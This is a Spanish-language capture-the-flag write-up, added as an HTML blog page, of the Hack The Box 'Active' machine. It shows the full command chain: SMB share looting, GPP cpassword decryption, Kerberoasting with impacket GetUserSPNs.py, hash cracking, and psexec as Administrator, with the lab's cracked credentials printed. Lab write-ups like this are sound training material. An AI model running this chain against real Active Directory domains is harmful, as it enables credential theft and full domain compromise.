@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Active HTB - WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Active HTB - WriteUP"/>
+<meta name="twitter:description" content="Reconnaisance Nmap Recon Results Discovery OS System
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-10 12:24:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds?"/>
+
+    <meta property="og:title" content="Active HTB - WriteUP" />
+<meta property="og:description" content="Reconnaisance Nmap Recon Results Discovery OS System
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-10 12:24:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/htb/active/" />
+<meta property="article:published_time" content="2022-03-27T15:18:19+02:00" />
+<meta property="article:modified_time" content="2022-03-27T15:18:19+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="John Doe" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Active HTB - WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="reconnaisance">Reconnaisance</h2>
+<h3 id="nmap-recon-results">Nmap Recon Results</h3>
+<p><strong>Discovery OS System</strong></p>
+<p><img src="https://i.imgur.com/9heFdbi.png" alt=""></p>
+<p><strong>Recon Open Ports</strong></p>
+<p><img src="https://i.imgur.com/0CXffi6.png" alt=""></p>
+<p><strong>Service Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-06-10 12:24:33Z<span style="color:#f92672">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+49173/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-06-10T12:25:30
+|_  start_date: 2021-06-10T12:20:45
+
+</code></pre></div><p>De la salida de nmap podemos deducir que es un controlador de dominio ya que posee el puerto 88  kerberos abierto, al igual que el 53 de un DNS algo comun en DC.</p>
+<p><strong>Dns Enumeration</strong></p>
+<p><img src="https://i.imgur.com/OwydP3l.png" alt=""></p>
+<p>cuando intentamos enumerar el servidor DNS vemos que no nos devuelve ninguna informacion relevante asi que continuamos con la enumeracion</p>
+<p><strong>Samba Enumeration</strong></p>
+<p><img src="https://i.imgur.com/HSnYiaz.png" alt=""></p>
+<p>Encontramos un recurso compartido con permisos de lectura  en el servidor samba, llamado <code>Replication</code> asi que listaremos su contenido para ver que archivos interesantes se pueden alojar en esta ubicacion. para esto nos descargaremos el recurso a nuestra maquina local</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smb: <span style="color:#ae81ff">\&gt;</span> recurse ON
+smb: <span style="color:#ae81ff">\&gt;</span> prompt OFF
+smb: <span style="color:#ae81ff">\&gt;</span> mget *
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as GPT.INI <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\G</span>PE.INI of size <span style="color:#ae81ff">119</span> as GPE.INI <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows NT<span style="color:#ae81ff">\S</span>ecEdit<span style="color:#ae81ff">\G</span>ptTmpl.inf of size <span style="color:#ae81ff">1098</span> as GptTmpl.inf <span style="color:#f92672">(</span>2.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.7 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\P</span>references<span style="color:#ae81ff">\G</span>roups<span style="color:#ae81ff">\G</span>roups.xml of size <span style="color:#ae81ff">533</span> as Groups.xml <span style="color:#f92672">(</span>1.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.8 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\R</span>egistry.pol of size <span style="color:#ae81ff">2788</span> as Registry.pol <span style="color:#f92672">(</span>5.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.7 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">22</span> as GPT.INI <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.4 KiloBytes/sec<span style="color:#f92672">)</span>
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows NT<span style="color:#ae81ff">\S</span>ecEdit<span style="color:#ae81ff">\G</span>ptTmpl.inf of size <span style="color:#ae81ff">3722</span> as GptTmpl.inf <span style="color:#f92672">(</span>6.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>listando los distintos archivos vemos que existe el fichero ==&ldquo;Groups.xml&rdquo;== que se nos hace muy interesante ya que el mismo posee  informacion del <strong>&ldquo;group policies preference&rdquo;</strong>  o GPP de windows , pero antes que eso googleamos</p>
+<p><img src="https://i.imgur.com/0LINUVt.png" alt=""></p>
+<p>en el siguiente <a href="https://ethicalhackingguru.com/how-to-exploit-groups-xml-files/">Recurso</a> encontramos lo sencillo que es desencriptar el hash del campo <strong>Cpassword</strong>  ya que Windows Libero la clave Privada AES-256 bit  con la que se genera el hash en el (2014), pueden echarle un vistaso en el siguiente <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">LINK</a></p>
+<p><img src="https://i.imgur.com/5wfhjv1.png" alt="AltText|800"></p>
+<p>Fichero <strong>Groups.xml</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span style="color:#f92672">&lt;Groups</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span style="color:#f92672">&gt;</span>
+	<span style="color:#f92672">&lt;User</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> <span style="color:#a6e22e">image=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">changed=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> <span style="color:#a6e22e">uid=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span style="color:#f92672">&gt;</span>
+		<span style="color:#f92672">&lt;Properties</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;U&#34;</span> <span style="color:#a6e22e">newName=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">fullName=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">description=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">cpassword=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> <span style="color:#a6e22e">changeLogon=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">noChange=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">neverExpires=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">acctDisabled=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">userName=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span><span style="color:#f92672">/&gt;</span>
+	<span style="color:#f92672">&lt;/User&gt;</span>
+<span style="color:#f92672">&lt;/Groups&gt;</span>
+
+</code></pre></div><h4 id="gpp-preferencias-de-política-de-grupo">GPP (preferencias de política de grupo)</h4>
+<p>Cuando se configura  la Política de grupo (GPP) , se crea un directorio  <strong>&ldquo;SYSVOL&rdquo;</strong> que posee <code>Groups.xml</code> donde el mismo es el que  el contiene las configuraciones correspondientes. Entre otras cosas, este archivo contiene informacion como el nombre de usuario y una contraseñas encriptada  en el campo <code>cpassword</code> , por ejp a continuacion filtraremos la data que nos interesa.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat Groups.xml | grep -oP <span style="color:#e6db74">&#34;name=\&#34;.*?\&#34;|cpassword=\&#34;.*?\&#34;&#34;</span>
+name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>
+cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span>
+</code></pre></div><p>bien ahora ahremos uso de la herramienta <code>gpp-decrypt</code>  para desencriptar el campo cpassword
+<img src="https://i.imgur.com/Faq1sHD.png" alt=""></p>
+<ul>
+<li>Credential : <code>active.htb\SVC_TGS:GPPstillStandingStrong2k18</code></li>
+</ul>
+<p>probaremos la credencial con crackmapexec para verificar si es valida</p>
+<p><img src="https://i.imgur.com/vFi6aXk.png" alt=""></p>
+<p>como vemos con la credencial  ahora tenemos privilegio de lectura en mas recursos, e inclusive  podemos enumerar usuarios o grupos del dominio con <strong>rpcclient</strong> pero ahora utilizaremos una herramienta alternativa de impacket llamada <strong>GetADUsers.py</strong> que nos permite  enumerar usuarios al igual que con rpcclient</p>
+<p><strong>Enumerando Usuarios y Grupos del Dominio Con Credenciales Validas</strong>
+<code>/usr/share/doc/python3-impacket/examples/GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.159.212</code></p>
+<p><img src="https://i.imgur.com/exRNYmP.png" alt=""></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<h4 id="kerberoasting">Kerberoasting</h4>
+<p>para efectuar el ataque kerberoasting usaremos la utilidad <strong>GetUserSPNs.py</strong> de impacket que nos permite realizar dicho ataque  para obtener un <strong>&ldquo;Ticket Granting Service&rdquo;</strong> o ==TGS== el cual podemos utilizar para crackear con JohnTheRipper o Hashcat y asi obtener la credencial de usuario &ldquo;Administrador&rdquo;
+<code>/usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.159.212 -request -output tgs-hash</code></p>
+<p><img src="https://i.imgur.com/A2HVvxM.png" alt=""></p>
+<p>y aqui tenemos nuestro TGS para crackear con JTR</p>
+<p><img src="https://i.imgur.com/3sTzvp4.png" alt=""></p>
+<p>crackeamos el hash del TGS  e intetaremos loguearnos</p>
+<p><img src="https://i.imgur.com/lTiSqKr.png" alt=""></p>
+<ul>
+<li>Valid Credential : <code>Administrator:Ticketmaster1968</code></li>
+</ul>
+<p><code>/usr/bin/impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.159.212</code></p>
+<p><img src="https://i.imgur.com/8CT7uzx.png" alt=""></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
